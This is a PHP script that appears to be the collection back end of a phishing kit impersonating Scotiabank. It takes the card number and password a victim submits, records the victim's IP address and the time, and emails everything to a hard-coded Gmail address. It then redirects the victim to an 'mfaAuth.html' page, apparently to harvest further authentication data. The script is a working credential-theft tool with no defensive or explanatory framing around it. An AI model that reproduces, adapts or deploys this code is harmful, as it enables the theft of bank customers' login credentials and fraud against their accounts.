<?php
$ip = getenv("REMOTE_ADDR");
$timedate = date("D/M/d, Y g(idea) a"); 
$cc = $_POST['cardNumberInputText'];
$pp = $_POST['passwordInputText'];
$data ="
=============##SCOTIA##========================
USER : $cc
pass : $pp
============EXTRA============================
IP : $ip
Time : $timedate
";

$subj="##SCO #$ip";

$emailusr = 'sarkolouty@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: ./mfaAuth.html");

?>